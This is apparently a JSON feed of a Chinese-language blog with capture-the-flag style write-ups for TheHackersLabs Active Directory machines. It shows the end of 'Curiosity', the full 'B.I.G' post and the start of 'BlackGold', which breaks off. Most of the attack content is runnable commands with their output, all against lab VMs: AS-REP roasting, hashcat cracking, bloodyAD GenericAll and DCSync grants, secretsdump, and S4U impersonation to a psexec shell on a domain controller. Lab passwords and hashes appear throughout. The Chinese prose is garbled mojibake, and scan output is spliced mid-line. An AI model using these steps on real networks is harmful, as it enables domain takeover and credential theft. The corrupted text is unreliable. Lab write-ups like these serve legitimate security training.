æƒé™\n\n![image.png](/post-images/TheHackersLabsCuriosity/image13.png)\n\n`AllowToAct` å°±æ˜¯ `AllowedToActOnBehalfOfOtherIdentity` ï¼Œ`GMSA_SVC` å·²æ·»åŠ åˆ° `DC.HACKME.THL` ä¸Šçš„ `msds-AllowedToActOnBehalfOfOtherIdentity` å±æ€§ä¸­\n\n```bash\nâœ  Curiosity getST.py -spn 'cifs/DC.hackme.thl' -impersonate 'administrator' 'hackme.thl/GMSA_SVC$' -hashes :e1eef5023c307890fdbb047e6554cfd0\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*] Requesting S4U2Proxy\n[*] Saving ticket in administrator@cifs_DC.hackme.thl@HACKME.THL.ccache\n```\n\n```bash\nâœ  Curiosity export KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache \n\nâœ  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.hackme.thl.....\n[*] Found writable share ADMIN$\n[*] Uploading file vgKATdFu.exe\n[*] Opening SVCManager on dc.hackme.thl.....\n[*] Creating service VDYV on dc.hackme.thl.....\n[*] Starting service VDYV.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n```\n\nè¯»å– `root.txt`\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n24axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\nä¸ç®—éš¾ï¼Œé™¤äº†çˆ†ç ´çš„å­—å…¸æœ‰ç‚¹ä¸æ˜æ‰€ä»¥\n\næœ€åä¸€æ­¥ï¼Œç›´æ¥çœ‹ `GMSA_SVC$` çš„ `OutBound Execution`æ˜¯ç©ºçš„ï¼Œä½†è‡ªå·±å¯»æ‰¾è·¯å¾„åˆèƒ½æ‰¾åˆ°å°±æœ‰ç‚¹å¥‡æ€ª\n\nä¸‹é¢çš„è„šæœ¬ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥æˆªå–åˆ° `jdoe` ç”¨æˆ·çš„`NET NTLM HASH`\n\n```bash\n*Evil-WinRM* PS C:\\temp> cat shareconnect.ps1\n\nwhile ($true) {\n    # Comando net use para reconectar el recurso compartido\n    net use Z: \\\\SQLserver\\bbdd /user:hackme\\jdoe '$pr1ng@'\n\n    # Espera de 1 minuto antes de volver a ejecutar\n    Start-Sleep -Seconds 60\n}\n```",
            "url": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity",
            "title": "TheHackersLabs - Curiosity",
            "summary": "Curiosity https://labs.thehackerslabs.com/machine/23 Recon PortScan nmap ç«¯å£æ‰«æ UDP ä¹Ÿæ‰«æ æšä¸¾æµ‹è¯• å› ä¸ºæ²¡æœ‰ Web ç«¯å£ï¼Œæˆ‘ä»¬ä» SMB æœåŠ¡å¼€å§‹æšä¸¾ æµ‹è¯•åŒ¿åè´¦æˆ· åœ¨è¿™é‡Œå°è¯•æšä¸¾äº†å¾ˆä¹…ï¼Œæ²¡ç»“æœ responder ...",
            "date_modified": "2025-07-19T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "AD",
                "Responder",
                "MSSQL",
                "gMSA"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G",
            "content_html": "\n# B.I.G\n\n> https://labs.thehackerslabs.com/machine/6\n> \n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image.png)\n\n## Recon\n\n### Port scan\n\nä½¿ç”¨ `nmap` å¯¹ç«¯å£è¿›è¡Œæ‰«æ\n\n```bash\nâœ  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST\nWarning: 192.168.212.4 giving up on port because retransmission cap hit (10).\nStrange read error from 192.168.212.4 (104 - 'Connection reset by peer')\nNmap scan report for 192.168.212.4\nHost is up (0.00037s latency).\nNot shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49686/tcp open  unknown\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.20 seconds\n```\n\n```bash\nâœ  BIG nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.212.4\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Dâœ  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49686/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-18T23:52:36\n|_  start_date: 2025-07-18T23:44:01\n|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: 15h59m55s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.212.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.13 seconds\n```\n\n### æšä¸¾æµ‹è¯•\n\n`SMB` åŒ¿åè´¦æˆ·æµ‹è¯•\n\n```bash\nâœ  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n```\n\n## WEB\n\n### ç›®å½•æ‰«æ\n\n`HTTP` æœåŠ¡\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image1.png)\n\n> ä¸¤æ®µæ­Œè¯çš„æ¥æº\n> \n> \n> ### **I keep it music music, I eat that lunch (Yeah)**\n> \n> - **æ¥æº:** è¿™å¥æ­Œè¯å‡ºè‡ª **Travis Scott** 2023å¹´ä¸“è¾‘ã€ŠUTOPIAã€‹ä¸­çš„å¤§çƒ­å•æ›² **ã€ŠFE!Nã€‹**ï¼Œæ˜¯å®¢ä¸²çš„æ­Œæ‰‹ **Playboi Carti** çš„éƒ¨åˆ†ã€‚\n> - **å«ä¹‰è§£æ:** è¿™å¥æ­Œè¯æ˜¯å…¸å‹çš„Playboi Cartié£æ ¼ï¼Œç”¨æç®€ä½†å……æ»¡æ€åº¦çš„è¯­è¨€æ¥è¡¨è¾¾è‡ªå·±çš„çŠ¶æ€ã€‚\n>     - **`I keep it music music`**: è¿™å¥è¯çš„æ„æ€æ˜¯â€œæˆ‘çš„ä¸–ç•Œé‡Œåªæœ‰éŸ³ä¹ï¼Œæˆ‘ä¸€ç›´ä¸“æ³¨äºéŸ³ä¹â€ã€‚ä»–ç”¨é‡å¤çš„â€œmusic musicâ€æ¥å¼ºè°ƒè‡ªå·±å®Œå…¨æ²‰æµ¸åœ¨åˆ›ä½œå’ŒéŸ³ä¹çš„æ°›å›´ä¸­ï¼Œè¿™æ˜¯ä»–ç”Ÿæ´»çš„æ ¸å¿ƒå’Œå…¨éƒ¨é‡å¿ƒã€‚è¿™æ˜¯ä¸€ç§å¯¹è‡ªå·±è‰ºæœ¯å®¶èº«ä»½çš„å¼ºè°ƒã€‚\n>     - **`I eat that lunch`**: è¿™æ˜¯ä¸€å¥éå¸¸å½¢è±¡çš„ä¿šè¯­ï¼Œæ„æ€æ˜¯**â€œæˆ‘è½»æ¾æå®šä¸€åˆ‡â€ã€â€œæˆ‘æŠŠç«äº‰å¯¹æ‰‹éƒ½å¹²æ‰äº†â€**ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œåƒåˆé¤æ˜¯ä¸€ä»¶å¤šä¹ˆè½»æ¾æ—¥å¸¸çš„äº‹æƒ…ã€‚ä»–ç”¨è¿™ä¸ªæ¯”å–»æ¥è¡¨ç¤ºä»–åœ¨è¯´å”±æ¸¸æˆï¼ˆRap Gameï¼‰ä¸­æ¸¸åˆƒæœ‰ä½™ï¼ŒæŠŠå‡»è´¥å¯¹æ‰‹ã€å–å¾—æˆåŠŸçœ‹å¾—åƒåƒåˆé¥­ä¸€æ ·ç®€å•ã€‚è¿™æ˜¯ä¸€ç§æåº¦è‡ªä¿¡å’Œå‚²æ…¢çš„ç‚«è€€ï¼ˆBraggingï¼‰ã€‚\n> \n> ---\n> \n> ### **It was all a dream**\n> \n> **å®ƒæ˜¯ä¸€ä¸ªæ–‡åŒ–ç¬¦å·ï¼Œæ˜¯å˜»å“ˆå†å²ä¸Šæœ€ç»å…¸ã€æœ€æ ‡å¿—æ€§çš„å¼€åœºç™½ä¹‹ä¸€ã€‚**\n> \n> - **æ¥æº:** è¿™å¥æ­Œè¯å‡ºè‡ªä¼ å¥‡è¯´å”±æ­Œæ‰‹ **The Notorious B.I.G. (åˆå Biggie Smalls)** åœ¨1994å¹´å‘å¸ƒçš„æ­Œæ›² **ã€ŠJuicyã€‹**ã€‚è¿™é¦–æ­Œæ˜¯ä»–çš„é¦–å¼ ä¸“è¾‘ã€ŠReady to Dieã€‹ä¸­çš„ä¸»æ‰“å•æ›²ï¼Œä¹Ÿæ˜¯ä»–çš„æˆåä½œã€‚\n> - **åŸæ–‡å’ŒèƒŒæ™¯:** å®Œæ•´çš„å¼€åœºæ˜¯ï¼š\n>     \n>     \"It was all a dream, I used to read Word Up! magazine\n>     Salt-n-Pepa and Heavy D up in the limousine\"\n>     \n\n---\n\nå¯¹ç½‘ç«™ç›®å½•çˆ†ç ´\n\n```bash\nâœ  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt\n                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.212.4\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [php, zip, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        2l       10w      151c http://192.168.212.4/images => http://192.168.212.4/images/\n200      GET       21l       41w      435c http://192.168.212.4/\n301      GET        2l       10w      153c http://192.168.212.4/contents => http://192.168.212.4/contents/\n[>-------------------] - 5s     48285/2491564 5m      found:3       errors:0      \n301      GET        2l       10w      150c http://192.168.212.4/songs => http://192.168.212.4/songs/\n200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt\n200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt\n200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg\n200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg\n[####################] - 8m   3322088/3322088 0s      found:6       errors:0      \n[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ \n[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/\n```\n\n`Skyisthelimit.txt` è¿˜æ˜¯ä¸€ä¸ªå­—å…¸\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image2.png)\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image3.png)\n\n### å›¾ç‰‡éšå†™\n\nè¿™ä¸€éƒ¨åˆ†çœ‹äº†ä¸€ä¸‹ write-up\n\n`notify.txt` \n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image4.png)\n\n> *â€œä½ åˆ°åº•é›‡äº†å“ªä¸ªè¯¥æ­»çš„å®¶ä¼™æ¥åšè¿™ä¸ªç½‘ç«™ï¼â€\nâ€œåˆæŠŠå¯†é’¥ç”¨ MD5 è—èµ·æ¥ï¼â€\nâ€œæˆ‘è¦ç‚’äº†é‚£ä¸ªå®¶ä¼™â€*\n> \n\né‚£ä¹ˆå¯†ç å¯èƒ½æ˜¯ `music` çš„ `MD5` å€¼\n\n```bash\nâœ  BIG echo -n \"music\" | md5sum                                                 \n18d6769919266cd0bd6cd78aa405d5d0  -\n```\n\né‚£ä¹ˆè¦åœ¨å“ªé‡Œä½¿ç”¨å¯†ç ï¼Ÿè—èµ·æ¥æ„Ÿè§‰æ˜¯`MISC`äº†\n\næˆ‘ä»¬å°† `images/big.jpg` å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨ `steghide` æ¥å¯¼å‡ºæ•°æ®\n\n```bash\nâœ  BIG steghide extract -sf big1.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n```\n\nä½†æ˜¯å¯†ç ä¸å¯¹ï¼Œä¸»é¡µä¸­è¿˜æœ‰å‡ æ®µæ­Œè¯ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image5.png)\n\n```bash\nâœ  BIG echo -n \"I keep it music music\" | md5sum\na6002952ffda89154a38a248280093d2  -\nâœ  BIG echo -n \"I eat that lunch (Yeah)\" | md5sum\nd2b5f22e80f680d9660a1d3ab81232fd  -\nâœ  BIG echo -n \"It was all a dream\" | md5sum\n99ae77c0c0faf78b872f9f452e3eaa24  -\n```\n\nèƒ½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ `frase.txt` ï¼Œä½¿ç”¨ MD5 `99ae77c0c0faf78b872f9f452e3eaa24`\n\n```bash\nâœ  BIG steghide extract -sf big2.jpg            \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nwrote extracted data to \"frase.txt\".\nâœ  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big4.jpg  \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\nâœ  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n```\n\né‡Œè¾¹æ˜¯ä¸ªå¯†ç \n\n```bash\nâœ  BIG cat frase.txt           \nBigpoppa1972\n```\n\n> å£°åç‹¼è—‰å…ˆç”Ÿï¼ˆThe Notorious B.I.G.ï¼Œ1972å¹´5æœˆ21æ—¥â€”â€”1997å¹´3æœˆ9æ—¥ï¼‰\n> \n\n### æšä¸¾ç”¨æˆ·å\n\næœ‰äº†å¯†ç ï¼Œä½†æ˜¯ä¸çŸ¥é“çš„ç”¨åœ¨å“ª\n\næ ¹æ®å‰é¢å¾—åˆ°çš„ä¿¡æ¯ï¼Œ`music` æˆ–è€… `Juice`ä¹Ÿå¯èƒ½æ˜¯ç”¨æˆ·å\n\n```bash\nWho the hell did you hire to create the website!\nHiding keys in MD5 again!\nI'm going to fire that guy\n\nmusic\n```\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\nâœ  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972\nRPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nRPC         192.168.212.4   135    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\nâœ  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972\nLDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nLDAP        192.168.212.4   389    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n```\n\nè¿œç¨‹ç™»å½•ï¼Œè¿›å»æ˜¯`TEMP`ç”¨æˆ·\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image6.png)\n\nå½“å‰ç›®å½•ä¸‹å¯ä»¥æ‹¿åˆ° `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\music\\Documents> type user.txt\n53bxxxxxxxxxxxxxxxxxxx\n```\n\n## åŸŸåˆ†æ\n\næ”¶é›†ä¿¡æ¯\n\n```bash\nâœ  ~ bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u music -p Bigpoppa1972\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bbr.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 7 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BIG.bbr.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250718165617_bloodhound.zip\n```\n\nç”¨æˆ·ç»„ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image7.png)\n\nå¾ˆæ˜æ˜¾ï¼Œç›®æ ‡ç”¨æˆ·æ˜¯`SONG`\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image8.png)\n\né€šè¿‡ `BLoodhound` å¯ä»¥çœ‹åˆ°å¯ä»¥ç”¨ `AS-REP` æ¥æ‰“\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image9.png)\n\n## **AS_REP Roasting**\n\n```bash\nâœBIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile users\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n$krb5asrep$23$song@BBR.THL:6d769bdfb04e89789dae27e05b47a393$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530\ncb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e\nba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352\n```\n\nä½¿ç”¨ `hashcat` ç ´è§£ï¼Œä½¿ç”¨ä¸Šé¢çš„çš„å­—å…¸\n\n```bash\nâœ  BIG hashcat -m 18200 hash Skyisthelimit.txt\n```\n\nå¾—åˆ°å¯†ç  `Passwordsave@`\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image10.png)\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\song:Passwordsave@ \n```\n\n## æƒé™æå‡\n\nå¯»æ‰¾åˆ©ç”¨é“¾ï¼Œé‡æ–°è·å–ä¸€ä¸‹æ•°æ®\n\n```bash\nbloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u song -p Passwordsave@\n```\n\n### é“¾å­ 1 âŒ\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image11.png)\n\nå°† `Song` æ·»åŠ  `SPECIAL PERMISSIONS` \n\n```bash\n$SecPassword = ConvertTo-SecureString 'Passwordsave@' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('bbr\\song', $SecPassword)\nAdd-DomainGroupMember -Identity 'SPECIAL PERMISSIONS' -Members 'song' -Credential $Cred\n```\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image12.png)\n\n`DACL` æ»¥ç”¨ï¼Œèµ‹äºˆè‡ªå·±æ‹¥æœ‰`users`çš„æ‰€æœ‰æƒé™\n\n```bash\nâœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'CN=USERS,DC=BBR,DC=THL' song\n[+] song has now GenericAll on CN=USERS,DC=BBR,DC=THL\n```\n\nä¿®æ”¹`administrator`å¯†ç ï¼Œå¤±è´¥ï¼Œå› ä¸º`administrator` æ˜¯ä¿æŠ¤ç”¨æˆ·ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹å¯†ç \n\n### é“¾å­ 2\n\næˆ‘ä»¬ç›´æ¥æ§åˆ¶åŸŸ\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image13.png)\n\n```bash\nâœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add genericAll 'DC=BBR,DC=THL' song                             \n[+] song has now GenericAll on DC=BBR,DC=THL\n```\n\nå†æ·»åŠ ä¸€ä¸ª`Dcsync`æƒé™ç»™è‡ªå·±\n\n```bash\nâœ  BIG bloodyAD -d 'bbr.thl' -u song -p 'Passwordsave@' --dc-ip 192.168.212.4 add dcsync song\n[+] song is now able to DCSync\n```\n\n`Dcsync`ï¼Œä½¿ç”¨ `secretsdump`\n\n```bash\nsecretsdump.py bbr.thl/song:'Passwordsave@'@192.168.212.4 -dc-ip 192.168.212.4\n```\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image14.png)\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image15.png)\n\nè¯»å– `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root.txt\n8e8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\néš¾ç‚¹åœ¨`Web`ä¸Šï¼Œä¸€æ—¶åŠä¼šå†™ä¸å‡ºæ¥\n\nä½†æ˜¯æ‹¿åˆ°`user`åå°±å¾ˆç®€å•äº†ï¼Œä¸€æŠŠæ¢­å“ˆ",
            "url": "https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G",
            "title": "TheHackersLabs - B.I.G",
            "summary": "B.I.G https://labs.thehackerslabs.com/machine/6 Recon Port scan ä½¿ç”¨ nmap å¯¹ç«¯å£è¿›è¡Œæ‰«æ æšä¸¾æµ‹è¯• SMB åŒ¿åè´¦æˆ·æµ‹è¯• WEB ç›®å½•æ‰«æ HTTP æœåŠ¡ ä¸¤æ®µæ­Œè¯çš„æ¥æº I keep it music music, I eat ...",
            "date_modified": "2025-07-18T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "Domain",
                "AD",
                "MISC",
                "AS_REPRoat"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/15/TheHackersLabsBlackGold",
            "content_html": "\n# BlackGold\n\n> https://labs.thehackerslabs.com/machine/9\n> \n\n![image.png](/post-images/TheHackersLabsBlackGold/image.png)\n\n## Recon\n\nç«¯å£æ‰«æ\n\n```bash\nâœ  BlackGold nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 00:30 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00030s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00031s latency).\nMAC Address: 08:00:27:B8:0A:4D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.10\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:31:D9:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds\n```\n\n```bash\nâœ  BlackGold nmap -sT 